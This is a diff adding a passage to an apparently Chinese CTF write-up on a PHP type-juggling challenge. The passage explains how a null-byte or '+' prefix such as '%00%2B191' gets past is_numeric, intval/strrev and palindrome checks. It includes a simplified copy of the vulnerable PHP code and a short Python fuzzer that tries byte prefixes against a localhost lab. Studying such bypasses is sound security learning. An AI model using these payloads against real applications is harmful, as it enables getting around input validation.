@@ -33,6 +33,51 @@
 
 `http://127.0.0.1/Php_Bug/02.php?number=%00%0c191`
 
+Fuzzing思路：
+ `http://127.0.0.1/Php_Bug/02.php?number=%00%2B191`
+%2B解析后为+，‘+191'=='191'且intval('191+')==191
+(这道题解题思路如下
+1. 条件is_numeric($_REQUEST['number'])为假，这个绕过的方法很多使用%00开头也可以再POST一个number参数把GET中的覆盖掉也可以，所以这一步很简单。
+2. 要求 $req['number']==strval(intval($req['number']))
+3. 要求intval($req['number']) == intval(strrev($req['number']))
+4. is_palindrome_number()返回False，这个条件只要在一个回文数比如191前面加一个字符即可实现
+5. 得到flag
+看上述条件，条件4需要加字符但是加了之后需要满足2,3这两个条件所以就可以在原题目中简化出2,3,4来进行Fuzzing，简化后后端代码如下：
+```php
+<?php
+function is_palindrome_number($number) {
+    $number = strval($number); //strval — 获取变量的字符串值
+    $i = 0;
+    $j = strlen($number) - 1; //strlen — 获取字符串长度
+    while($i < $j) {
+        if($number[$i] !== $number[$j]) {
+            return false;
+        }
+        $i++;
+        $j--;
+    }
+    return true;
+}
+$a = trim($_GET['number']);
+var_dump(($a==strval(intval($a)))&(intval($a)==intval(strrev($a)))&!is_palindrome_number($a))
+?>
+```
+Fuzzing代码如下：
+```python
+import requests
+for i in range(256):
+    rq = requests.get("http://127.0.0.1/vuln/CTF/1/index.php?number=%s191"%("%%%02X"%i))
+    if '1' in rq.text:
+        print "%%%02X"%i
+```
+Fuzzing结果如下:
+```
+%0C
+%2B
+```
+
+
+
 资料：
 
 - [PHP类型与逻辑+fuzz与源代码审计](http://www.chnpanda.com/961.html)
